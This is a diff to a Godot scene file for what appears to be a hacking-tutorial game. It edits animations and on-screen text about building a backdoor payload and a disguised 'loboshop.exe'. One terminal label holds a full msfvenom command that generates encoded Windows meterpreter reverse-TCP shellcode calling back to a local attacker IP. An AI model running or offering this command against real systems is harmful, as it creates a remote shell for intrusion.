@@ -50,8 +50,8 @@ void fragment() {
 [sub_resource type="ShaderMaterial" id="ShaderMaterial_irnc6"]
 shader = SubResource("Shader_pajh4")
 shader_parameter/rect_color = Color(0, 0, 0, 0.607843)
-shader_parameter/hole_position = Vector2(-0.07, 1.075)
-shader_parameter/hole_size = Vector2(1.875, 1.175)
+shader_parameter/hole_position = Vector2(0.87, -0.12)
+shader_parameter/hole_size = Vector2(0.39499998, 0.545)
 
 [sub_resource type="Animation" id="Animation_cbi8u"]
 length = 0.001
@@ -163,6 +163,21 @@ tracks/8/keys = {
 "transitions": PackedFloat32Array(1),
 "update": 1,
 "values": [false]
+}
+tracks/9/type = "value"
+tracks/9/imported = false
+tracks/9/enabled = true
+tracks/9/path = NodePath("WindowContainer/Terminal/Label:text")
+tracks/9/interp = 1
+tracks/9/loop_wrap = true
+tracks/9/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["STEP 2:
+CREATING PAYLOAD
+
+creating a payload that will open a backdoor to the victim's PC"]
 }
 
 [sub_resource type="Animation" id="Animation_k36dn"]
@@ -1744,7 +1759,7 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["STEP 1:
+"values": ["STEP 2:
 CREATING PAYLOAD
 
 creating a payload that will open a backdoor to the victim's PC"]
@@ -1908,7 +1923,34 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": [""]
+"values": ["STEP 2:
+CREATING PAYLOAD
+
+creating a payload that will open a backdoor to the victim's PC"]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("WindowContainer/Terminal/Label:visible")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+tracks/7/type = "value"
+tracks/7/imported = false
+tracks/7/enabled = true
+tracks/7/path = NodePath("WindowContainer/Terminal/ColorRect/MarginContainer2/Label:visible_characters")
+tracks/7/interp = 1
+tracks/7/loop_wrap = true
+tracks/7/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [-1]
 }
 
 [sub_resource type="Animation" id="Animation_irnc6"]
@@ -1985,7 +2027,10 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": [""]
+"values": ["STEP 2:
+CREATING PAYLOAD
+
+creating a payload that will open a backdoor to the victim's PC"]
 }
 
 [sub_resource type="Animation" id="Animation_igunv"]
@@ -2062,7 +2107,10 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": [""]
+"values": ["STEP 2:
+CREATING PAYLOAD
+
+creating a payload that will open a backdoor to the victim's PC"]
 }
 
 [sub_resource type="Animation" id="Animation_d0uvu"]
@@ -2139,7 +2187,10 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": [""]
+"values": ["STEP 2:
+CREATING PAYLOAD
+
+creating a payload that will open a backdoor to the victim's PC"]
 }
 
 [sub_resource type="Animation" id="Animation_7e827"]
@@ -2216,7 +2267,10 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": [""]
+"values": ["STEP 2:
+CREATING PAYLOAD
+
+creating a payload that will open a backdoor to the victim's PC"]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -2363,7 +2417,10 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": [""]
+"values": ["STEP 2:
+CREATING PAYLOAD
+
+creating a payload that will open a backdoor to the victim's PC"]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -3328,7 +3385,7 @@ tracks/8/keys = {
 "times": PackedFloat32Array(0, 1),
 "transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": ["This links the CPR library used earlier, now let's run it and generate our file.exe", "Great! you can now close the terminal and check your file.exe or continue in creating our listener (Click the IDE)"]
+"values": ["This links the CPR library used earlier, now let's run it and generate our file.exe", "Great! loboshop.exe is now created we can proceed to our next step"]
 }
 tracks/9/type = "value"
 tracks/9/imported = false
@@ -3576,7 +3633,6 @@ theme_override_font_sizes/font_size = 21
 text = "file.cpp"
 
 [node name="fileexe" parent="Desktop" instance=ExtResource("2_jrtar")]
-visible = false
 layout_mode = 2
 script = null
 
@@ -3848,8 +3904,8 @@ size_flags_vertical = 0
 text = "root@DESKTOP-123ABC:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.102  LPORT=8000 
 --platform windows --arch x86 -e x86/shikata_ga_nai -f c -o shellcode.txt"
 autowrap_mode = 2
-visible_characters = 170
-visible_ratio = 0.97979796
+visible_characters = 54
+visible_ratio = 1.4594594
 metadata/_edit_use_anchors_ = true
 
 [node name="Overlay" type="ColorRect" parent="WindowContainer/Terminal/ColorRect"]
@@ -3863,17 +3919,25 @@ grow_vertical = 2
 mouse_filter = 2
 
 [node name="Label" type="Label" parent="WindowContainer/Terminal"]
+visible = false
 layout_mode = 1
 anchors_preset = -1
 anchor_left = 0.097087376
 anchor_top = 0.220339
 anchor_right = 0.89320385
 anchor_bottom = 0.88771194
-theme_override_font_sizes/font_size = 36
+offset_left = 36.0
+offset_top = 17.279999
+offset_right = 36.0
+offset_bottom = 17.279999
+theme_override_font_sizes/font_size = 33
+text = "STEP 2:
+CREATING PAYLOAD
+
+creating a payload that will open a backdoor to the victim's PC"
 horizontal_alignment = 1
 vertical_alignment = 1
 autowrap_mode = 2
-visible_characters = 58
 metadata/_edit_use_anchors_ = true
 
 [node name="generating exe" parent="WindowContainer/Terminal" instance=ExtResource("11_csfkx")]
@@ -3900,6 +3964,7 @@ anchor_left = 0.0843835
 anchor_top = 0.273785
 anchor_right = 0.888371
 anchor_bottom = 0.377535
+value = 100.0
 
 [node name="Label" type="Label" parent="WindowContainer/Terminal/generating exe"]
 layout_mode = 1
@@ -3908,10 +3973,11 @@ anchor_left = 0.0599175
 anchor_top = 0.157303
 anchor_right = 0.650826
 anchor_bottom = 0.22191
-text = "Creating file.exe file..."
+text = "file.exe created!"
 metadata/_edit_use_anchors_ = true
 
 [node name="Debug" type="Control" parent="WindowContainer"]
+visible = false
 anchors_preset = 0
 offset_left = 107.0
 offset_top = 550.0
